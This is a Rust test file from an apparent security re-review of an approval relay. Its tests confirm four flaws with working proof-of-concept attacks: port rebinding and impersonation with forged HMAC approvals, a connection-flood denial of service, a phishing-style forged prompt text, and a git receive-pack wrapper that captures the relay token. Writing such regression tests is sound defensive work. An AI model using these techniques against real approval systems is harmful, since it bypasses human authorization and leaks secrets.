//! Re-review of the CR-010 approval relay (docs/verify/REREVIEW-2026-11-09-relay.md).
//! Each test PASSES while the weakness is present; a fix should invert it.
//! Synthetic values only.

mod e2e_support;

use e2e_support::approval::{answer, pw};
use e2e_support::World;
use fail2commit_core::approval::relay;
use fail2commit_core::approver::new_request;
use fail2commit_core::digest::Digest;
use fail2commit_core::protocol::{ApprovalKind, ApprovalRequest, Decision, ResultCode};
use sha2::{Digest as _, Sha256};
use std::io::{BufRead, BufReader, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

fn req(tag: &str, summary: &str, password: bool, allowed: Vec<Decision>) -> ApprovalRequest {
    new_request(
        ApprovalKind::Operation,
        &Digest::of("git.push", &serde_json::json!([tag])).unwrap(),
        summary.to_string(),
        vec![],
        vec![],
        60,
        password,
        allowed,
    )
    .unwrap()
}

/// HMAC-SHA-256, the same construction as relay.rs (the attacker knows it).
fn hmac(key: &[u8], parts: &[&[u8]]) -> String {
    let mut k = [0u8; 64];
    k[..key.len()].copy_from_slice(key);
    let mut inner = Sha256::new();
    inner.update(k.map(|b| b ^ 0x36));
    for (i, p) in parts.iter().enumerate() {
        if i > 0 {
            inner.update([0u8]);
        }
        inner.update(p);
    }
    let mut outer = Sha256::new();
    outer.update(k.map(|b| b ^ 0x5c));
    outer.update(inner.finalize());
    hex::encode(outer.finalize())
}

fn request_mac(token: &str, json: &str) -> String {
    hmac(
        token.as_bytes(),
        &[b"fail2commit-relay-request", json.as_bytes()],
    )
}

/// A token holder's authenticated request line; returns the reply line, if any.
fn send_authenticated(addr: &str, token: &str, r: &ApprovalRequest) -> Option<String> {
    let mut c = TcpStream::connect(addr).ok()?;
    let json = serde_json::to_string(r).unwrap();
    let msg = serde_json::json!({"request": json, "mac": request_mac(token, &json)});
    writeln!(c, "{msg}").ok()?;
    c.set_read_timeout(Some(Duration::from_secs(5))).ok()?;
    let mut line = String::new();
    BufReader::new(c).read_line(&mut line).ok()?;
    (!line.is_empty()).then_some(line)
}

/// RR-001 (CONFIRMED): once the single slot is used, the relay drops its
/// listener. A token holder frees the port that way, binds it, and answers the
/// real hook with a valid MAC: no host approval and no password check ran.
#[test]
fn rr001_token_holder_burns_the_slot_then_impersonates_the_host() {
    let host_ran = Arc::new(Mutex::new(0u32));
    let h = host_ran.clone();
    let r = relay::start(move |_| {
        *h.lock().unwrap() += 1;
        // The real host would end the forged request just as fast: a request
        // with no non-cancel decision returns Cancel before any prompt.
        Ok(Decision::Cancel)
    })
    .unwrap();
    let target = r.env_value().to_string();
    let (addr, token) = target.split_once('/').unwrap();
    let (addr, token) = (addr.to_string(), token.to_string());

    // Attacker (a git sibling that inherited the variable): burn the slot.
    let burn = req("burn", "burn", false, vec![]);
    assert!(send_authenticated(&addr, &token, &burn).is_some());
    // Wait for the listener to go away, then take the port.
    let t0 = Instant::now();
    let impostor = loop {
        if let Ok(l) = TcpListener::bind(&addr) {
            break l;
        }
        assert!(
            t0.elapsed() < Duration::from_secs(10),
            "could not rebind the relay port"
        );
        std::thread::sleep(Duration::from_millis(20));
    };

    // The real hook: a password-gated force push. It reaches the impostor.
    let real = req("real", "git push --force origin main", true, vec![Decision::ApproveOnce]);
    let (real2, target2) = (real.clone(), target.clone());
    let hook = std::thread::spawn(move || relay::forward(&real2, &target2));
    let (c, _) = impostor.accept().unwrap();
    let mut out = c.try_clone().unwrap();
    let mut line = String::new();
    BufReader::new(c).read_line(&mut line).unwrap();
    let id = &real.request_id;
    let mac = hmac(
        token.as_bytes(),
        &[
            id.as_bytes(),
            real.nonce.as_bytes(),
            real.digest.as_bytes(),
            b"ApproveOnce",
        ],
    );
    let reply = serde_json::json!({
        "request_id": real.request_id, "nonce": real.nonce, "digest": real.digest,
        "decision": "approve_once", "mac": mac,
    });
    writeln!(out, "{reply}").unwrap();
    assert_eq!(
        hook.join().unwrap(),
        Decision::ApproveOnce,
        "the hook accepted an approval from a process that is not the host"
    );
    assert_eq!(*host_ran.lock().unwrap(), 1, "only the burn reached the host");
    drop(r);
}

/// RR-002 (CONFIRMED): sixteen token-less connections end the relay, so the real
/// hook finds nothing listening (fail closed, but a denial of service for any
/// local process that can find the ephemeral port).
#[test]
fn rr002_sixteen_tokenless_connections_kill_the_relay() {
    let r = relay::start(|_| Ok(Decision::ApproveOnce)).unwrap();
    let addr = r.env_value().split_once('/').unwrap().0.to_string();
    let _junk: Vec<TcpStream> = (0..16).filter_map(|_| TcpStream::connect(&addr).ok()).collect();
    let t0 = Instant::now();
    while TcpStream::connect(&addr).is_ok() {
        assert!(t0.elapsed() < Duration::from_secs(10), "still listening");
        std::thread::sleep(Duration::from_millis(50));
    }
    let real = req("real", "push", false, vec![Decision::ApproveOnce]);
    assert_eq!(relay::forward(&real, r.env_value()), Decision::Cancel);
}

/// RR-003 (CONFIRMED): the host binds nothing about the request to its push. An
/// authenticated request with any summary, details, kind-Operation digest,
/// `password_required` and a far-future expiry reaches the host's decision
/// function unchanged (the real function then prompts the user's client).
#[test]
fn rr003_relay_forwards_any_operation_text_and_expiry_to_the_host() {
    let seen: Arc<Mutex<Vec<ApprovalRequest>>> = Default::default();
    let s = seen.clone();
    let r = relay::start(move |q| {
        s.lock().unwrap().push(q.clone());
        Ok(Decision::Cancel)
    })
    .unwrap();
    let (addr, token) = r.env_value().split_once('/').unwrap();
    let mut forged = req(
        "x",
        "Session expired: re-enter your force-push password",
        true,
        vec![Decision::ApproveOnce],
    );
    forged.expires_at = u64::MAX / 2;
    let _ = send_authenticated(addr, token, &forged);
    let got = seen.lock().unwrap();
    assert_eq!(got.len(), 1);
    assert_eq!(got[0].summary, forged.summary);
    assert!(got[0].password_required);
    assert_eq!(got[0].expires_at, forged.expires_at);
}

/// RR-004 (CONFIRMED): git children other than the fail2commit hook inherit the
/// token. `remote.origin.receivepack` runs before pre-push and records it.
/// Control: the push still works and the chained hook sees nothing.
#[test]
fn rr004_receive_pack_child_inherits_the_relay_token() {
    let w = World::new();
    let (work, _remote) = w.env.repo_with_remote("repo");
    w.setup();
    w.set_password("push");
    w.env
        .git(&work, &["commit", "-q", "--amend", "-m", "rewritten"]);
    let seen = w.env.root.join("rp-seen.txt");
    let wrapper = w.env.root.join("rp.sh");
    let fwd = |p: &std::path::Path| p.to_string_lossy().replace('\\', "/");
    std::fs::write(
        &wrapper,
        format!(
            "#!/bin/sh\nprintf '%s' \"${{FAIL2COMMIT_APPROVAL_RELAY-UNSET}}\" > '{}'\nexec git-receive-pack \"$@\"\n",
            fwd(&seen)
        ),
    )
    .unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&wrapper, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    let rp = format!("sh '{}'", fwd(&wrapper));
    w.env.git(&work, &["config", "remote.origin.receivepack", &rp]);

    let mut api = w.api(&work, &["git", "push", "--force", "origin", "main"]);
    let real = api.approval_request();
    api.send(&answer(&real, Decision::ApproveOnce, Some(&pw("push"))));
    let (resp, _, out) = api.finish();
    assert_eq!(resp.code, ResultCode::Ok, "{out}");
    let v = std::fs::read_to_string(&seen).expect("receive-pack wrapper ran");
    assert!(
        v.starts_with("127.0.0.1:") && v.contains('/'),
        "the git child did not see the token: {v:?}"
    );
}
